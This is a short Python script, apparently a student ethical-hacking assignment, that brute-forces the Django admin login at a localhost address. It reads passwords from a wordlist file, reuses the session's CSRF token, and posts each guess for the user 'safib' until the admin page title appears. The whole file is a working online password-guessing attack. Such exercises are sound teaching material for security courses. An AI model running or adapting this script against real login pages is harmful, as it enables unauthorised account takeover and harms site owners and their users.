import sys
import requests

url = "http://localhost:8000/admin/"
username = "safib"

password_file = "eh_4\Opdracht 1\pass.txt"
file = open(password_file, "r")

a_session = requests.Session()
a_session. get(url)
session_cookies = a_session.cookies
cookies_dictionary = session_cookies.get_dict()
crsf = cookies_dictionary.get('csrftoken')
print (crsf)
print(cookies_dictionary)

for password in file.readlines():
    password = password.strip("\n")

    data = {'username':username, 'password':password,'csrfmiddlewaretoken':crsf, "Login":'submit'}
    send_data_url = requests.post(url, data=data, cookies=cookies_dictionary)

    if "<title>Site administration | Django site admin</title>" in send_data_url.text:
        print("[*] Password found: %s " % password)
        sys.exit()

    else:
        print("[*] Attempting password: %s" % password)
        print()